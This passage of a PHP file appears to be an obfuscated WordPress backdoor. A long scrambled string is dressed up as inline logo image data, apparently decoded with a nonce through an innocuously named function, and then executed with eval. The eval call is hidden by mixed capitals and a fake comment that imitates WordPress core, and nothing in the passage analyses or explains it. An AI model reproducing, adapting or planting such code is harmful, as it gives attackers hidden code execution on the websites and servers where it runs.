uULH0eDE4A#HZxPR3#9anIVBx9Gl7Oypl%4f7rrtXXUrBhaUR0LaJczrVqtGF2NGlqNrkYKoaQNAlI#n8XiNzc#atbblXpLK%6Gc#SytnbJIvgg7O9#SRuuQn8jjqoAgP#0qbW0Qle9otPEXquq%GSb8EcweIbJpG15pYFsedSYCh%yr3EhNW5dn6u2qPhXm0ggSCIWC#9ILVZSOPQgIazsJnzEu5BgJYUYPvxKkqNBEgEHRCQXUOZIv#vkrpRMEhX0uVVtymsT6xB0vqlHKQtLAPt3Zxh8eYahXq#SqOFrWhvq5fWLL1eNt7WscrN98JPvagADKWaoTW0baoTDF0d4U31bO0h%MIDc8LXamzcH%FMBgi%xc1hyHoSmZhMCtSqLZBu4GVbBcV7GFwmDrFa1ffCT72rJ7Wa7cWDUUpTaL6O03mrmJN%BT74nKK1WWYVUjRQRLSO9bJ##3#LQxa#YCQG1mzVSIQ1aNa58e6eHOt90sNcpF1HfK89tH%zkOwBunwHIt3fKCz3rNZr6ux8Gar3JQ2of%OQ7BopooJ1e6iQraxJzHODiWaQUEtqr6DSVs%lhOkABlzVjZ57HAu0a7VwNd#Ul60Lm64u4#k8rnVMsGGQhNjhiztcQctD8h#U9o3kRJ2rWn1tgPoV0rwz64Cfff04Rxt4qaFk%bXiJKGgTcERgNJ#jh2rb2Nv%n3zHGPETeiAuBzkYROrNpsJWI8FWYkn4#UhdMJpscNOnr24Ef1B%52YejgaO9f48uUpcvrx3JvTL6SksOnlQvL0ahZuoiItF#PJQ9RpCiuq0qJeKgVe4oeTzhON%z8BPUk%4DjByvc0tF#bFQka4aSSacvH0bD0KcDyyP1Lc27ObdOmC8pyvOeHcRJwN7nRzuTQMsv63gZhspkXc3wFkPAMvh66pbakL6wOLDL1bEjZ3u6XOaMv%MRhO%4ios7wCNP3TLlN74Mk77QNLJY487F2Hf5k#TQpnk1QQavU2uBV%4MgZ8K346W2qeNrtD9fjSGSX5ncfk02nTuQ8vJ7HtmfijwXgL0jJe2pt77A3OJ2NwvX4g#tlbdOZNYlvg#Jz92FZz92HBY8xu6ViuUFdK0P6zFVkYQbasmfLTfaVw8X8PF#%uJSV6c%cxJX9uY9dcq9kAxeTXHOVU6Pq8B%ykCMN49NZkqKTNG4%qqq2dD7DGfdK5#OPY37##KRmFwmKtdy6iEdG#XUN42m4t67x7Id1qWSHToqL#Nz%4H#apd0csbRu13E6ykdh7WFvYMfLi#zr59PxOB5lozw#Zmz25D403p8UN59xudZokge8ty2fMX1#%vSvviRxDQDjmk4N15CINKyCCh8i3lgUiHu019KhNrXkbRVdKXylZzKRlR5GK7FOjFF#AQaiBL2QJ9n%%9#P%%QUSTbZ1CLsfZ6Otfe%Xw2mU#33weW%Xh0fqQd6Hp3Jl8Jr6v#75f2roxVUk9qRtLe6mkUa64#P3f8H">';
preg_match('#<img src="data:image/png;(.*)">#', $wp_default_logo, $logo_data);

$logo_image = $logo_data[1];

$wpautop = pre_term_name($logo_image, $wp_nonce);

if (isset($wpautop)) {
    eVAl/** Sets up the WordPress Environment. */($wpautop);
}